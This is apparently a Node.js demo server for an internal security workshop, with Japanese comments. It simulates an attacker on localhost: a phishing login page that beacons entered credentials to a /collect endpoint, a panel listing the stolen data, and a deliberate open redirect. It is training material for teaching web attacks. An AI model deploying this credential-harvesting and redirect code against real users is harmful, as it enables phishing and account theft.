#!/usr/bin/env node
/**
 * 【社内勉強会用】攻撃者シミュレータ＆意図的に脆弱なデモサーバ
 *
 * 本番ページ（src/security/attack-simulation.mjs）は意図的にこのサーバを「攻撃者」として
 * 使う：ビーコン（/collect）の受け口・フィッシング資格情報の回収・強制リダイレクト先
 * （/owned）。サーバが動いていない場合、本番側の遷移段階は自動的に省略される。
 * 127.0.0.1 のみで待ち受け、外部ネットワークへの通信は発生しません。
 *
 * 使い方:
 *   node examples/security-workshop/attack-server.mjs
 *   （PORT=10000 node ... でポート変更。既定 9999）
 *
 * やっていること:
 *   /vulnerable-page … 意図的に脆弱なデモページ（XSS / localStorage トークン / オープンリダイレクト / CSRF）
 *   /attacker-frame  … クリックジャッキングの攻撃者ページ
 *   /fake-login      … オープンリダイレクトの飛び先になる偽ログイン（フィッシング）
 *   /collect?d=…     … ペイロードが盗んだデータの受け口（1x1 GIF ビーコンで返答）
 *   /panel           … 攻撃者が盗んだデータを見るダッシュボード
 *   /redirect?to=…   … オープンリダイレクトの再現
 */
import { createServer } from 'node:http';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

const HERE = dirname(fileURLToPath(import.meta.url));
const PORT = Number(process.env.PORT) || 9999;
const HOST = '127.0.0.1';

/** 1x1 透過GIF。攻撃者ビーコン（new Image().src）への返答。 */
const PIXEL = Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64');
/** 攻撃者が回収したデータ（メモリ内のみ。終了すれば消える）。 */
const captures = [];

/** 攻撃者のパネルでも、捕獲データを HTML に差し込む前には必ずエスケープする（自衛の基本）。 */
const esc = (s) => String(s).replace(/[&<>"']/g, (c) => ({
  '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;',
}[c]));

const page = (name) => readFileSync(join(HERE, name), 'utf8');

const html = (res, body, status = 200) => {
  res.writeHead(status, { 'content-type': 'text/html; charset=utf-8', 'cache-control': 'no-store' });
  res.end(body);
};

/** 偽ログインページ（フィッシング）。入力を /collect に送った上で教育メッセージを出す。 */
const fakeLoginPage = `<!doctype html><html lang="ja"><head><meta charset="utf-8"><title>再ログイン</title>
<style>body{font-family:system-ui,sans-serif;max-width:340px;margin:12vh auto;text-align:center;color:#222}
input{font:inherit;padding:10px;width:100%;box-sizing:border-box;border:1px solid #bbb;border-radius:6px}
button{width:100%;padding:10px;background:#1a73e8;color:#fff;border:0;border-radius:6px;font-size:16px}</style></head>
<body>
  <h2>セッションの有効期限が切れました</h2>
  <p>続けるには再ログインしてください。</p>
  <form onsubmit="event.preventDefault();var i=document.getElementById('i'),p=document.getElementById('p');
    new Image().src='/collect?d='+encodeURIComponent('PHISH id='+i.value+' pw='+p.value)+'&src=phishing';
    setTimeout(function(){document.body.innerHTML='<h2>（教育用デモ）あなたの入力は攻撃者に送信されました。<br><a href=&quot;/panel&quot;&gt;/panel&lt;/a&gt; で確認できます。</h2>'},400);">
    <p><input id="i" placeholder="メールアドレス"></p>
    <p><input id="p" type="password" placeholder="パスワード"></p>
    <button>ログイン</button>
  </form>
  <p style="font-size:11px;color:#a00">※これは偽サイトです。社内勉強会用のモック。</p>
</body></html>`;

const ownedPage = () => `<!doctype html><html lang="ja"><head><meta charset="utf-8"><title>乗っ取られました（教育用）</title>
<style>body{font-family:system-ui,sans-serif;background:#140a0a;color:#ffdada;max-width:640px;margin:10vh auto;padding:0 20px}
a{color:#7fd0ff}code{color:#ffb3b3}h1{font-size:22px}li{margin:6px 0;word-break:break-all;font-family:monospace;font-size:13px}</style></head>
<body>
<h1>☠ あなたのブラウザは攻撃者のサイトへ到達しました</h1>
<p>本番ページで動いていたペイロードが <code>location.href</code> を書き換え、
ここ（<code>127.0.0.1:9999/owned</code>）へ強制遷移させました。これが「勝手に飛ばされる」攻撃の本体です。</p>
<p>遷移までの間に攻撃者へ送られたデータ（<a href="/panel">/panel</a> でも見られます）:</p>
<ul>${captures.length ? captures.map((c) => `<li>${esc(c.via)}: ${esc(c.data)}</li>`).join('') : '<li>（なし）</li>'}</ul>
<p><a href="#" onclick="history.back();return false">← 本物のサイトへ戻る（履歴を戻る）</a></p>
<p style="font-size:11px;color:#a88">※教育用デモ。外部ネットワークへの通信はありません。</p>
</body></html>`;

const panelPage = () => `<!doctype html><html lang="ja"><head><meta charset="utf-8"><title>攻撃者パネル（教育用）</title>>
<style>body{font-family:monospace;background:#0b0f14;color:#9fe88f;padding:24px}
li{margin:6px 0;word-break:break-all}a{color:#7fd0ff}h1{font-size:18px}</style></head>
<body>
<h1>☠ 攻撃者パネル（教育用デモ）</h1>
<p>脆弱ページで実行されたペイロードが送ってきたデータ。</p>
<ul>${captures.map((c) => `<li>${esc(c.at)} — ${esc(c.data)} <small>(${esc(c.via)})</small></li>`).join('')
  || '<li>（まだ何も届いていません。脆弱ページでペイロードを実行してください）</li>'}</ul>
<p><a href="/vulnerable-page">→ 脆弱ページへ</a></p>
</body></html>`;

const routes = {
  '/': 'vulnerable-page.html',
  '/vulnerable-page': 'vulnerable-page.html',
  '/attacker-frame': 'attacker-frame.html',
};

createServer((req, res) => {
  const url = new URL(req.url, `http://${HOST}:${PORT}`);
  const { pathname } = url;
  try {
    if (pathname === '/collect') {
      const entry = {
        at: new Date().toISOString(),
        data: url.searchParams.get('d') ?? '',
        via: url.searchParams.get('src') ?? 'beacon',
      };
      captures.push(entry);
      console.log(`[捕獲] ${entry.at}  ${entry.data}  (via ${entry.via})`);
      res.writeHead(200, {
        'content-type': 'image/gif',
        // 教育ポイント: 「Access-Control-Allow-Origin: *」で何でも受け入れる
        // 収集サーバの危険性（攻撃者ビーコンは CORS を気にせず飛んでくる）。
        'access-control-allow-origin': '*',
        'cache-control': 'no-store',
      });
      res.end(PIXEL);
      return;
    }
    if (pathname === '/panel') return html(res, panelPage());
    if (pathname === '/owned') return html(res, ownedPage());
    if (pathname === '/fake-login') return html(res, fakeLoginPage);
    if (pathname === '/redirect') {
      // 教育ポイント: 飛び先の無検証リダイレクト（オープンリダイレクト）。
      res.writeHead(302, { location: url.searchParams.get('to') ?? '/' });
      res.end();
      return;
    }
    const file = routes[pathname];
    if (file) return html(res, page(file));
    html(res, '<h1>404</h1><a href="/vulnerable-page">デモへ</a>', 404);
  } catch (e) {
    html(res, `<pre>server error: ${esc(e)}</pre>`, 500);
  }
}).listen(PORT, HOST, () => {
  console.log(`[教育用デモ] 待受け開始: http://${HOST}:${PORT}/  （Ctrl+C で終了）`);
  console.log(`  脆弱ページ   : http://${HOST}:${PORT}/vulnerable-page`);
  console.log(`  攻撃者パネル : http://${HOST}:${PORT}/panel`);
  console.log(`  強制リダイレクト先（本番ページ用）: http://${HOST}:${PORT}/owned`);
  console.log(`  攻撃URL生成  : node examples/security-workshop/build-links.mjs`);
  console.log('  ※ 127.0.0.1 のみで待ち受け。外部への送信はありません。');
});
